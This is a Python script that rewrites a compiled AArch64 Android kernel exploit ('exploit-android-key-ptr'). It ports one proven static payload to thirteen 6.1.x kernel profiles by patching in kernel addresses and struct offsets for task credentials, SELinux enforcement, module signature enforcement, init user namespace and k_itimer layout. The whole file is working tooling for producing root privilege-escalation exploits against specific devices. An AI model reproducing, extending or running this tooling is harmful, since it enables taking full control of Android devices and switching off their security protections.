#!/usr/bin/env python3
"""Rebase the proven 1.0.36 g264 blind payload onto audited 6.1.x profiles.

This is a static ELF rewriter.  It never executes the input or output payloads.
The original 34 KiB dynamic payloads are used only once by `extract` to record
per-kernel constants in success-profiles.json.  `apply`/`verify` then reproduce
and check the static, blind-reclaim payloads without those old binaries.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import struct
from pathlib import Path

BIAS = 0x78000000
BASE_SHA256 = "cc0b9693dcdba564585c39dfe3eb386860f1cede4251d0d7aca63d1e51762843"
DYNAMIC_G264_SHA256 = "26287204cb15b58ffd95103f3c33554ac8d734bc7ab6195028c13498fa083562"
PROFILE_NAMES = ("g264", "g3306", "g84", "g77f", "gce849", "g5859", "g54d", "g40b1", "ge9da", "g8a496", "g2e1f", "gaaa", "g8d6")
# BTF-audited layouts that the old 34 KiB payloads did not all encode correctly.
LAYOUT_OVERRIDES = {
    "g77f": (0x840, 0x118),
    "gce849": (0x840, 0x118),
    "g40b1": (0x840, 0x118),
}

# Current 34 KiB dynamic layout, shared by all extracted profiles.
CURRENT_SEQS = {
    "selinux_minus7": 0x332C,
    "timer_link": 0x3378,
    "cred_link": 0x337C,
    "sig_enforce": 0x3900,
    "copy_alloc_link": 0x3FB8,  # provenance only; the successful chain does not use it
    "root_user": 0x5A8C,
    "groups": 0x5A90,
}
CURRENT_TIMER_REPEATS = (0x4414, 0x57E4)
CURRENT_KITIMER_CMP = (0x45AC, 0x45B8, 0x5934, 0x5940)
CURRENT_TASK_CRED_ADD = 0x5A50
# Namespace pointers are derived from the same offsets used by the proven code.
# Their constant-pool location varies between compiler outputs, so extraction
# validates the derived qwords by value rather than assuming a file offset.
CURRENT_USER_NS_FROM_ROOT = -0x290
CURRENT_UCOUNTS_FROM_GROUPS = 0x570

# Proven static g264 layout.  Every high-address sequence is MOVN + two MOVKs.
STATIC_SEQS = {
    "sig_enforce": (0x21E6D8,),
    "selinux_minus7": (0x21E7B4, 0x2203B0, 0x2214F4, 0x2220AC, 0x22224C),
    "cred_link": (0x21F640,),
    "timer_link": (0x221030,),
    "user_ns": (0x2220F0,),
    "groups": (0x2220F4,),
    "neg_timer_link": (0x21EE08,),
}
STATIC_TASK_CRED = (0x221598, 0x221A94, 0x222088)
STATIC_REAL_CRED = (0x221570, 0x221AAC, 0x222094)
STATIC_KITIMER_CMP = (0x21EDE4, 0x221148)
STATIC_RODATA = {
    "ucounts": 0x2004C0,
    "groups": 0x2004C8,
    "root_user": 0x2005E0,
    "user_ns": 0x2005E8,
}
STATIC_G264 = {
    "timer_link": 0xFFFFFFC0083BED18,
    "cred_link": 0xFFFFFFC0080E6C6C,
    "selinux_minus7": 0xFFFFFFC00A6FC9F9,
    "sig_enforce": 0xFFFFFFC00A45DC60,
    "user_ns": 0xFFFFFFC00A0D0748,
    "root_user": 0xFFFFFFC00A0D09D8,
    "groups": 0xFFFFFFC00A0D1CF8,
    "ucounts": 0xFFFFFFC00A0D2268,
    "neg_timer_link": (1 << 64) - 0xFFFFFFC0083BED18,
}


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


class Elf:
    def __init__(self, data: bytes):
        self.data = data
        if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
            raise ValueError("not a little-endian ELF64 file")
        if struct.unpack_from("<H", data, 18)[0] != 183:
            raise ValueError("not an AArch64 ELF")
        phoff = struct.unpack_from("<Q", data, 32)[0]
        phentsize, phnum = struct.unpack_from("<HH", data, 54)
        self.loads = []
        for i in range(phnum):
            off = phoff + i * phentsize
            p_type, p_flags, p_offset, p_vaddr, _, p_filesz = struct.unpack_from("<IIQQQQ", data, off)
            if p_type == 1:
                self.loads.append((p_vaddr, p_offset, p_filesz))

    def offset(self, vaddr: int, size: int = 4) -> int:
        for base, off, filesz in self.loads:
            if base <= vaddr and vaddr + size <= base + filesz:
                return off + vaddr - base
        raise ValueError(f"virtual address 0x{vaddr:x} is not file-backed")


def mov_fields(word: int):
    for name, mask in (("movz", 0x52800000), ("movk", 0x72800000), ("movn", 0x12800000)):
        if word & 0x7F800000 == mask:
            return name, (word >> 31) & 1, (word >> 21) & 3, (word >> 5) & 0xFFFF, word & 31
    raise ValueError(f"not a MOVZ/MOVN/MOVK instruction: 0x{word:08x}")


def word_at(data: bytes, elf: Elf, vaddr: int) -> int:
    return struct.unpack_from("<I", data, elf.offset(vaddr))[0]


def sequence_addresses(data: bytes, elf: Elf, vaddr: int) -> list[int]:
    first = mov_fields(word_at(data, elf, vaddr))
    if first[0] not in ("movn", "movz"):
        raise ValueError(f"0x{vaddr:x}: missing MOVN/MOVZ")
    _, sf, _, _, rd = first
    addresses = [vaddr]
    shifts = []
    for i in range(1, 17):
        addr = vaddr + i * 4
        try:
            op, op_sf, hw, _, op_rd = mov_fields(word_at(data, elf, addr))
        except ValueError:
            continue
        if op_rd != rd:
            continue
        if op_sf != sf or op != "movk":
            raise ValueError(f"0x{vaddr:x}: destination was overwritten before MOVK completion")
        addresses.append(addr)
        shifts.append(hw)
        if len(addresses) == 3:
            if shifts != [1, 2]:
                raise ValueError(f"0x{vaddr:x}: unexpected MOVK shifts {shifts}")
            return addresses
    raise ValueError(f"0x{vaddr:x}: incomplete three-instruction constant")


def materialize(data: bytes, elf: Elf, vaddr: int) -> int:
    addresses = sequence_addresses(data, elf, vaddr)
    first = mov_fields(word_at(data, elf, addresses[0]))
    kind, sf, _, _, _ = first
    bits = 64 if sf else 32
    mask = (1 << bits) - 1
    value = 0
    for i, addr in enumerate(addresses):
        op, op_sf, hw, imm, _ = mov_fields(word_at(data, elf, addr))
        if i == 0:
            value = (imm << (16 * hw)) & mask if op == "movz" else (~(imm << (16 * hw))) & mask
        else:
            value = (value & ~(0xFFFF << (16 * hw)) | (imm << (16 * hw))) & mask
    return value


def patch_mov16(buf: bytearray, elf: Elf, vaddr: int, imm: int) -> None:
    off = elf.offset(vaddr)
    word = struct.unpack_from("<I", buf, off)[0]
    mov_fields(word)
    if not 0 <= imm <= 0xFFFF:
        raise ValueError(f"0x{vaddr:x}: immediate out of range")
    struct.pack_into("<I", buf, off, (word & ~(0xFFFF << 5)) | (imm << 5))


def patch_sequence(buf: bytearray, elf: Elf, vaddr: int, value: int) -> int:
    addresses = sequence_addresses(buf, elf, vaddr)
    changed = 0
    for addr in addresses:
        off = elf.offset(addr)
        before = buf[off:off + 4]
        op, _, hw, _, _ = mov_fields(struct.unpack_from("<I", buf, off)[0])
        chunk = (value >> (16 * hw)) & 0xFFFF
        patch_mov16(buf, elf, addr, chunk ^ 0xFFFF if op == "movn" else chunk)
        changed += sum(a != b for a, b in zip(before, buf[off:off + 4]))
    return changed


def patch_imm12(buf: bytearray, elf: Elf, vaddr: int, imm: int) -> None:
    off = elf.offset(vaddr)
    word = struct.unpack_from("<I", buf, off)[0]
    if not 0 <= imm <= 0xFFF:
        raise ValueError(f"0x{vaddr:x}: imm12 out of range")
    struct.pack_into("<I", buf, off, (word & ~(0xFFF << 10)) | (imm << 10))


def imm12_at(data: bytes, elf: Elf, vaddr: int) -> int:
    return (word_at(data, elf, vaddr) >> 10) & 0xFFF


def mov16_at(data: bytes, elf: Elf, vaddr: int) -> int:
    return mov_fields(word_at(data, elf, vaddr))[3]


def biased_to_raw(value: int) -> int:
    raw = value - BIAS
    if not 0xFFFFFFC000000000 <= raw <= 0xFFFFFFFFFFFFFFFF:
        raise ValueError(f"unexpected biased address 0x{value:x}")
    return raw


def extract_profile(path: Path, profile_name: str) -> dict:
    data = path.read_bytes()
    if len(data) != 34192:
        raise ValueError(f"{path}: unexpected dynamic payload size {len(data)}")
    elf = Elf(data)
    values = {key: materialize(data, elf, addr) for key, addr in CURRENT_SEQS.items()}
    for addr in CURRENT_TIMER_REPEATS:
        if materialize(data, elf, addr) != values["timer_link"]:
            raise ValueError(f"{path}: timer repeat mismatch at 0x{addr:x}")
    kitimer = imm12_at(data, elf, CURRENT_KITIMER_CMP[0])
    for addr in CURRENT_KITIMER_CMP[1:]:
        if imm12_at(data, elf, addr) != kitimer:
            raise ValueError(f"{path}: k_itimer comparison mismatch at 0x{addr:x}")
    values.update({
        "task_cred": imm12_at(data, elf, CURRENT_TASK_CRED_ADD),
        "kitimer_size": kitimer,
        "user_ns": values["root_user"] + CURRENT_USER_NS_FROM_ROOT,
        "ucounts": values["groups"] + CURRENT_UCOUNTS_FROM_GROUPS,
    })
    for key in ("user_ns", "ucounts"):
        if data.find(values[key].to_bytes(8, "little")) < 0:
            raise ValueError(f"{path}: derived {key} 0x{values[key]:x} not present in constant pool")
    if values["task_cred"] not in (0x838, 0x840) or kitimer not in (0x108, 0x118):
        raise ValueError(f"{path}: unrecognised layout family")
    audited_cred, audited_kitimer = LAYOUT_OVERRIDES.get(
        profile_name, (values["task_cred"], kitimer))
    result = {
        "source_dynamic_sha256": sha256(data),
        "source_dynamic_task_cred": values["task_cred"],
        "source_dynamic_kitimer_size": kitimer,
        "layout_corrected": (audited_cred, audited_kitimer) != (values["task_cred"], kitimer),
        "task_cred": audited_cred,
        "real_cred": audited_cred - 8,
        "kitimer_size": audited_kitimer,
    }
    for name in ("timer_link", "cred_link", "selinux_minus7", "sig_enforce",
                 "root_user", "groups", "user_ns", "ucounts", "copy_alloc_link"):
        result[name] = biased_to_raw(values[name])
    result["neg_timer_link"] = (1 << 64) - result["timer_link"]
    return result


def cmd_extract(args) -> None:
    profiles = {}
    for name in PROFILE_NAMES:
        directory = f"98260-{name}"
        path = args.current_root / directory / "exploit-android-key-ptr"
        profile = extract_profile(path, name)
        profile["directory"] = directory
        profiles[name] = profile
        print(f"EXTRACT {name} task=0x{profile['task_cred']:x} kitimer=0x{profile['kitimer_size']:x} timer=0x{profile['timer_link']:x}")
    if profiles["g264"]["source_dynamic_sha256"] != DYNAMIC_G264_SHA256:
        raise ValueError("g264 dynamic baseline hash mismatch")
    for key, value in STATIC_G264.items():
        if key != "neg_timer_link" and profiles["g264"][key] != value:
            raise ValueError(f"g264 {key}: extracted 0x{profiles['g264'][key]:x}, expected 0x{value:x}")
    if profiles["g264"]["neg_timer_link"] != STATIC_G264["neg_timer_link"]:
        raise ValueError("g264 negative timer mismatch")
    doc = {
        "format": 1,
        "base_sha256": BASE_SHA256,
        "dynamic_g264_sha256": DYNAMIC_G264_SHA256,
        "raw_link_bias_subtracted": BIAS,
        "profiles": profiles,
    }
    args.output.write_text(json.dumps(doc, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    print(f"WROTE {args.output}")


def patch_profile(base: bytes, profile: dict) -> tuple[bytes, int]:
    if sha256(base) != BASE_SHA256:
        raise ValueError("successful static base hash mismatch")
    elf = Elf(base)
    for name, addresses in STATIC_SEQS.items():
        if name == "neg_timer_link":
            continue
        expected = STATIC_G264[name]
        for addr in addresses:
            actual = materialize(base, elf, addr)
            if actual != expected:
                raise ValueError(f"base 0x{addr:x} {name}=0x{actual:x}, expected 0x{expected:x}")
    if materialize(base, elf, STATIC_SEQS["neg_timer_link"][0]) != STATIC_G264["neg_timer_link"]:
        raise ValueError("base negative timer mismatch")
    for addr in STATIC_TASK_CRED:
        if mov16_at(base, elf, addr) != 0x838:
            raise ValueError(f"base task_cred mismatch at 0x{addr:x}")
    for addr in STATIC_REAL_CRED:
        if mov16_at(base, elf, addr) != 0x830:
            raise ValueError(f"base real_cred mismatch at 0x{addr:x}")
    for addr in STATIC_KITIMER_CMP:
        if imm12_at(base, elf, addr) != 0x108:
            raise ValueError(f"base k_itimer mismatch at 0x{addr:x}")
    for name, addr in STATIC_RODATA.items():
        actual = struct.unpack_from("<Q", base, elf.offset(addr, 8))[0]
        if actual != STATIC_G264[name]:
            raise ValueError(f"base rodata {name}=0x{actual:x}, expected 0x{STATIC_G264[name]:x}")

    buf = bytearray(base)
    changed = 0
    for name, addresses in STATIC_SEQS.items():
        value = profile[name]
        for addr in addresses:
            changed += patch_sequence(buf, elf, addr, value)
    for addr in STATIC_TASK_CRED:
        off = elf.offset(addr)
        before = buf[off:off + 4]
        patch_mov16(buf, elf, addr, profile["task_cred"])
        changed += sum(a != b for a, b in zip(before, buf[off:off + 4]))
    for addr in STATIC_REAL_CRED:
        off = elf.offset(addr)
        before = buf[off:off + 4]
        patch_mov16(buf, elf, addr, profile["real_cred"])
        changed += sum(a != b for a, b in zip(before, buf[off:off + 4]))
    for addr in STATIC_KITIMER_CMP:
        off = elf.offset(addr)
        before = buf[off:off + 4]
        patch_imm12(buf, elf, addr, profile["kitimer_size"])
        changed += sum(a != b for a, b in zip(before, buf[off:off + 4]))
    for name, addr in STATIC_RODATA.items():
        off = elf.offset(addr, 8)
        before = buf[off:off + 8]
        struct.pack_into("<Q", buf, off, profile[name])
        changed += sum(a != b for a, b in zip(before, buf[off:off + 8]))

    output = bytes(buf)
    out_elf = Elf(output)
    for name, addresses in STATIC_SEQS.items():
        for addr in addresses:
            actual = materialize(output, out_elf, addr)
            if actual != profile[name]:
                raise AssertionError(f"verify 0x{addr:x} {name}=0x{actual:x}, expected 0x{profile[name]:x}")
    for addr in STATIC_TASK_CRED:
        assert mov16_at(output, out_elf, addr) == profile["task_cred"]
    for addr in STATIC_REAL_CRED:
        assert mov16_at(output, out_elf, addr) == profile["real_cred"]
    for addr in STATIC_KITIMER_CMP:
        assert imm12_at(output, out_elf, addr) == profile["kitimer_size"]
    for name, addr in STATIC_RODATA.items():
        assert struct.unpack_from("<Q", output, out_elf.offset(addr, 8))[0] == profile[name]
    return output, changed


def load_doc(path: Path) -> dict:
    doc = json.loads(path.read_text(encoding="utf-8"))
    if doc.get("format") != 1 or doc.get("base_sha256") != BASE_SHA256:
        raise ValueError("unsupported profile manifest")
    return doc


def selected_profiles(doc: dict, only: str | None):
    for name in PROFILE_NAMES:
        if only and name != only:
            continue
        if name not in doc["profiles"]:
            raise ValueError(f"missing profile {name}")
        yield name, doc["profiles"][name]


def cmd_apply(args) -> None:
    doc = load_doc(args.profiles)
    base = args.base.read_bytes()
    for name, profile in selected_profiles(doc, args.only):
        output, changed = patch_profile(base, profile)
        digest = sha256(output)
        dst = args.output_root / profile["directory"] / "exploit-android-key-ptr"
        if args.check:
            current = dst.read_bytes()
            if current != output:
                raise ValueError(f"{name}: output is stale or differs from deterministic rebuild")
            expected = profile.get("generated_sha256")
            if expected and expected != digest:
                raise ValueError(f"{name}: manifest output hash mismatch")
            print(f"OK {name} size={len(output)} sha256={digest} changed_bytes={changed}")
        else:
            mode = dst.stat().st_mode if dst.exists() else 0o755
            dst.write_bytes(output)
            os.chmod(dst, mode)
            profile["generated_sha256"] = digest
            print(f"WROTE {name} size={len(output)} sha256={digest} changed_bytes={changed} path={dst}")
    if not args.check:
        args.profiles.write_text(json.dumps(doc, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="command", required=True)
    ex = sub.add_parser("extract", help="extract constants from the old 34 KiB payloads")
    ex.add_argument("--current-root", type=Path, required=True)
    ex.add_argument("--output", type=Path, required=True)
    ex.set_defaults(func=cmd_extract)
    for name, check in (("apply", False), ("verify", True)):
        ap = sub.add_parser(name, help="write or verify deterministic static payloads")
        ap.add_argument("--base", type=Path, required=True)
        ap.add_argument("--profiles", type=Path, required=True)
        ap.add_argument("--output-root", type=Path, required=True)
        ap.add_argument("--only", choices=PROFILE_NAMES)
        ap.set_defaults(func=cmd_apply, check=check)
    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
